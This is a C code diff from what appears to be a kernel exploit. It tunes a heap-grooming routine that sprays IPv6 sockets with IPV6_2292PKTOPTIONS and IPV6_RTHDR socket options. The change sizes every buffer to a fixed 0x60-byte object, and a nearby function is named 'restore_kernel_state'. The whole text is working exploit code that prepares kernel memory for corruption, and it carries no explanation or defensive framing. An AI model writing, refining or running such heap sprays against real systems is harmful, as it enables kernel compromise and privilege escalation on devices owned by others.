@@ -39,6 +39,7 @@
 #define DEFRAG_PASSES 3
 #define DEFRAG_SMALL_SOCKETS 32
 #define DEFRAG_LARGE_SOCKETS 32
+#define PKTOPTS_OBJ_SIZE 0x60
 
 #define set_pktopts(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len)
 #define set_rthdr(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
@@ -452,25 +453,26 @@ void restore_kernel_state() {
 }
 
 void targeted_heap_defragmentation(int target_size) {
+    (void)target_size;
     for (int pass = 0; pass < DEFRAG_PASSES; pass++) {
         int defrag_small[DEFRAG_SMALL_SOCKETS];
         int defrag_large[DEFRAG_LARGE_SOCKETS];
 
+        char pktopts_buf[PKTOPTS_OBJ_SIZE] = {0};
+
         for (int i = 0; i < DEFRAG_SMALL_SOCKETS; i++) {
             defrag_small[i] = fast_new_socket();
             if (defrag_small[i] >= 0) {
-                char pktopts_buf[256] = {0};
-                set_pktopts(defrag_small[i], pktopts_buf, 128);
-                set_rthdr(defrag_small[i], pktopts_buf, 64);
+                set_pktopts(defrag_small[i], pktopts_buf, PKTOPTS_OBJ_SIZE);
+                set_rthdr(defrag_small[i], pktopts_buf, PKTOPTS_OBJ_SIZE);
             }
 
             defrag_large[i] = socket(AF_INET6, SOCK_STREAM, 0);
             if (defrag_large[i] >= 0) {
-                char pressure_buf[512] = {0};
+                char pressure_buf[PKTOPTS_OBJ_SIZE] = {0};
                 setsockopt(defrag_large[i], IPPROTO_IPV6,
-                          IPV6_2292PKTOPTIONS, pressure_buf, target_size);
+                           IPV6_2292PKTOPTIONS, pressure_buf, PKTOPTS_OBJ_SIZE);
             }
-
         }
 
         nanosleep(NANOSLEEP_10US, NULL);
